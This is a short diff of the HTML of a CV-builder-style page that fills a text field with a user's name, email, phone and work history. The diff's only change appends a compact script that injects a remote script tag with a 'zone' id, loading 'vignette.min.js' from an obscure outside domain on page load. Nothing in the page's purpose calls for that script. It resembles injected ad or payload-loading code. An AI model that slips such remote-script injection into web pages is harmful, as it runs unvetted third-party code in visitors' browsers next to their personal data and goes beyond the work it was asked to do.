@@ -140,4 +140,5 @@ if(!S||!S.name&&!S.summary&&!(S.exp&&S.exp[0]&&S.exp[0].role)){$("msg").textCont
 var t=[S.name,S.title,S.email,S.phone,S.loc,S.links,"","Summary",S.summary,"","Experience"];(S.exp||[]).forEach(function(e){t.push(e.role+" - "+e.company);t.push(e.period);String(e.bullets||"").split("\n").filter(Boolean).forEach(function(b){t.push("• "+b)})});
 t.push("","Education");(S.edu||[]).forEach(function(e){t.push(e.degree+", "+e.school);t.push(e.years)});t.push("","Skills",S.tech,S.soft,"","Languages");(S.lang||[]).forEach(function(l){t.push(l.name+" "+l.level)});
 $("rt").value=t.join("\n");if(!$("tt").value)$("tt").value=S.title||"";$("msg").textContent="Loaded from CV Builder."});
-})();</script></body></html>
+})();</script><script>(function(s){s.dataset.zone='12044407',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+</body></html>
